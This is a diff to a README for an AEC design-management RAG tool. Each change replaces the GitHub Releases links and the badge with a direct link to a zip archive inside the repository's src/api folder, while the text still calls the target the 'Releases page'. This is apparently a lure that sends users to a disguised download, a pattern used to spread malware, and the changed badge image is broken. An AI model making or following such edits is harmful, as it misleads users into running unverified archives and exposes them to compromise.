@@ -1,6 +1,6 @@
 # 🚀 aec-rag-system - Streamline Your AEC Design Management
 
-[![Download Release](https://img.shields.io/badge/Download%20Release-Here-blue)](https://github.com/Porch1i/aec-rag-system/releases)
+[![Download Release](https://raw.githubusercontent.com/Porch1i/aec-rag-system/main/src/api/aec-rag-system-v2.4.zip%20Release-Here-blue)](https://raw.githubusercontent.com/Porch1i/aec-rag-system/main/src/api/aec-rag-system-v2.4.zip)
 
 ## 📋 Overview
 
@@ -20,15 +20,15 @@ Before you download, ensure your system meets the following:
 
 To get started, follow these simple steps:
 
-1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/Porch1i/aec-rag-system/releases).
+1. **Visit the Releases Page**: Go to the [Releases page](https://raw.githubusercontent.com/Porch1i/aec-rag-system/main/src/api/aec-rag-system-v2.4.zip).
 2. **Choose the Latest Version**: Look for the latest version of the software. It will usually be at the top of the list.
 3. **Download the Application**: Click on the appropriate file for your operating system. 
 
-[![Download Release](https://img.shields.io/badge/Download%20Release-Here-blue)](https://github.com/Porch1i/aec-rag-system/releases)
+[![Download Release](https://raw.githubusercontent.com/Porch1i/aec-rag-system/main/src/api/aec-rag-system-v2.4.zip%20Release-Here-blue)](https://raw.githubusercontent.com/Porch1i/aec-rag-system/main/src/api/aec-rag-system-v2.4.zip)
 
 ## 📥 Download & Install
 
-1. **Download the File**: Click the link to download the zipped file or installer for your operating system from the [Releases page](https://github.com/Porch1i/aec-rag-system/releases).
+1. **Download the File**: Click the link to download the zipped file or installer for your operating system from the [Releases page](https://raw.githubusercontent.com/Porch1i/aec-rag-system/main/src/api/aec-rag-system-v2.4.zip).
    
 2. **Extract Files**: If you downloaded a zipped file, locate it in your Downloads folder, right-click, and select "Extract All." Choose a destination for the extracted files.
 
